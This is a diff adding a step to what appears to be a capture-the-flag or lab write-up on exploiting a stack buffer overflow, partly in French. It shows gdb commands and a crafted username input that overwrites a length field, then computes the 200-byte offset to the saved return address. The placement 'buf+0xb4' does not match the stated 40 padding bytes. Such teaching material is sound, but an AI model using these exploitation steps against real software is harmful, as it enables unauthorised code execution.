@@ -40,6 +40,26 @@ $1 = (void (*)(void)) 0x55555555488c   # example
 
 Use your own address if it differs.
 
+4.5. Find the exact offset to the return address
+
+```gdb
+(gdb) b *handle_msg+100     # breakpoint after set_msg
+(gdb) run
+# Enter username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf4\x01\x00\x00
+# Enter message:  BBBB... (beaucoup de B)
+(gdb) p $rsp
+$2 = (void *) 0x7fffffffe510      # start of buffer
+
+(gdb) p $rbp + 8
+$3 = (void *) 0x7fffffffe5d8      # return address
+
+# Calcul de l'offset :
+(gdb) p/d (long)($rbp + 8) - (long)$rsp
+$4 = 200                           # Offset = 200 bytes
+```
+
+The return address is always at **RBP + 8** on x86-64. Calculate the offset by subtracting $rsp (buffer start) from $rbp + 8.
+
 5. Exploit plan
 
 * **Stage 1 (username):** set `msg_len` to a large value (e.g., `500`). We do this by writing 40 padding bytes, then the little-endian integer `0x000001f4` at `buf+0xb4`.
